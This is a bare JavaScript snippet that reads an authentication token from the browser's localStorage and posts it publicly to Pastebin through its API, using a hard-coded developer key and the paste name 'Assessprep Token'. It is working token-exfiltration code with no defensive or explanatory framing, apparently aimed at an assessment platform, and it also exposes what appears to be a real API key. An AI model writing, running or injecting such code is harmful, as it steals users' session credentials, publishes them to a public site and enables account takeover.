var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/x-www-form-urlencoded");

var urlencoded = new URLSearchParams();
urlencoded.append("api_dev_key", "uRCEvTvuzP4MOEJeHgK7hztuBgfAnTOn");
urlencoded.append("api_paste_code", "token: " + localStorage.token);
urlencoded.append("api_option", "paste");
urlencoded.append("api_paste_name", "Assessprep Token");
urlencoded.append("api_paste_private", "0");

var requestOptions = {
  method: "POST",
  headers: myHeaders,
  body: urlencoded,
  redirect: "follow",
};

fetch("https://pastebin.com/api/api_post.php", requestOptions)
  .then((response) => response.text())
  .then((result) => console.log(result))
  .catch((error) => console.log("error", error));
